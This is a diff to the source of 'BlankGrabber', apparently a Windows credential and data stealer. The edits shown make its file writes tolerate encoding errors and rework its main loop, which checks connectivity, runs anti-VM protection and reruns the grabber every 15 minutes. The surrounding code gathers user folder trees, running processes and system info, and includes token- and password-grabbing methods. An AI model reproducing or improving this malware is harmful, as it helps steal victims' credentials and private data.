@@ -193,7 +193,7 @@ class BlankGrabber:
                 self.logs(e, sys.exc_info())
 
     def logs(self, e, exc_info):
-        with open(os.path.join(self.tempfolder, "Logs.txt"), "a") as file:
+        with open(os.path.join(self.tempfolder, "Logs.txt"), "a", errors= "ignore") as file:
             file.write(f"\nLine {exc_info[2].tb_lineno} : {e.__class__.__name__} : {e}")
 
     def getpass(self):
@@ -239,15 +239,15 @@ class BlankGrabber:
         output = []
         for location in ["Desktop", "Downloads", "Music", "Pictures", "Videos"]:
             output.append(f"[{location}]\n\n{self.tree(os.path.join(os.getenv('userprofile'), location))}")
-        with open(os.path.join(self.system, "Tree.txt"), "w", encoding= "utf-8") as file:
+        with open(os.path.join(self.system, "Tree.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
             file.write("\n\n".join(output).strip())
 
         output = subprocess.run("tasklist", capture_output= True, shell= True).stdout.decode()
-        with open(os.path.join(self.system, "Task List.txt"), "w") as tasklist:
+        with open(os.path.join(self.system, "Task List.txt"), "w", errors= "ignore") as tasklist:
             tasklist.write(output.strip())
 
         output = subprocess.run("systeminfo", capture_output= True, shell= True).stdout.decode()
-        with open(os.path.join(self.system, "System Info.txt"), "w") as file:
+        with open(os.path.join(self.system, "System Info.txt"), "w", errors= "ignore") as file:
             file.write(output.strip())
 
     def getTokens(self):
@@ -430,10 +430,9 @@ if __name__ == "__main__":
 
     while True:
         try:
-            r = json.loads(self.http.request("GET", "https://httpbin.org/get?1=2").data.decode())
+            r = json.loads(http.request("GET", "https://httpbin.org/get?1=2").data.decode())
             if r.get("args").get("1") != "2":
                 os._exit(0)
-        except Exception:
             if VMPROTECT:
                 vmprotect()
             frozen = hasattr(sys, "frozen")
@@ -454,5 +453,5 @@ if __name__ == "__main__":
                 BlankGrabber()
             except Exception:
                 pass
-        finally:
-            time.sleep(1800) #30 Minutes
+        except Exception:
+            time.sleep(900) #15 Minutes
